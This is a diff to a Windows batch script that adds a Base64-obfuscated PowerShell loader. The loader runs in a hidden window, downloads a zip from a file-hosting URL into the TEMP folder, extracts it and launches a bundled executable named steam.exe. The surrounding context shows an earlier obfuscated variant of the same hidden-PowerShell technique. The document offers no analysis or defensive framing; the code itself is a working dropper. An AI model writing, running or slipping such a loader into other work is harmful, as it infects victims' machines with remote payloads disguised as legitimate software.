@@ -14,3 +14,32 @@ set zxyzyz....xyxyzzz='}';
 
 :: Now concatenate the parts and run the final command
 powershell -w h -noni -nop -c "%aabb2233z....xyz1234z....xyz9876z%%aaa987z....yzx123z....xyzyx%%zxyzy1234z....yzxyzz12z%%yxyxyzz....12345z%%zzxyz987z....xyxyzzzz%%yzxyzyz....xyyzzyz%%xyzzyz....xyzzxyzzyz%%xyzzyzzxy1234z%%zxyzyz....xyxyzzz%"
+
+
+
+@echo off
+:: Each variable’s value is the Base64 encoding of one part (using UTF-8)
+set "XxAz=UG93ZXJzaGVsbCAtdyBoIC1ub25pIC1ub3AgLWMgIiR1PSc=" 
+set "YyB1=aHR0cHM6Ly8weDB4MC5zdC84ZlZLeml6Jw=="
+set "ZzC2=JHokPXtlbnY6VEVNUH0nK1wnOGZWSy56aXAn"  
+set "XxD3=JGU9JHtlbnY6VEVNUH0nK1wnZSc="  
+set "YyE4=aXdyICR1IC1vICR6Ow=="  
+set "ZzF5=RXhwYW5kLUFyY2hpdmUgJHokIC1mOw=="  
+set "XxG6=JHM9KChnY2kgJGVfLXIgLWZpIHN0ZWFtLmV4ZXxzZWxlY3QgLWYgMSkuRnVsbE5hbWU7"  
+set "YyH7=aWYgKCRzKXs="  
+set "ZzI8=U3RhcnQgJHM="  
+set "XxJ9=fQ=="
+
+for /f "delims=" %%A in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%XxAz%'))"') do set "dec1=%%A"
+for /f "delims=" %%B in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%YyB1%'))"') do set "dec2=%%B"
+for /f "delims=" %%C in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%ZzC2%'))"') do set "dec3=%%C"
+for /f "delims=" %%D in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%XxD3%'))"') do set "dec4=%%D"
+for /f "delims=" %%E in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%YyE4%'))"') do set "dec5=%%E"
+for /f "delims=" %%F in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%ZzF5%'))"') do set "dec6=%%F"
+for /f "delims=" %%G in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%XxG6%'))"') do set "dec7=%%G"
+for /f "delims=" %%H in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%YyH7%'))"') do set "dec8=%%H"
+for /f "delims=" %%I in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%ZzI8%'))"') do set "dec9=%%I"
+for /f "delims=" %%J in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%XxJ9%'))"') do set "dec10=%%J"
+
+set "final=%dec1%%dec2%%dec3%%dec4%%dec5%%dec6%%dec7%%dec8%%dec9%%dec10%"
+powershell -w h -noni -nop -c "%final%"
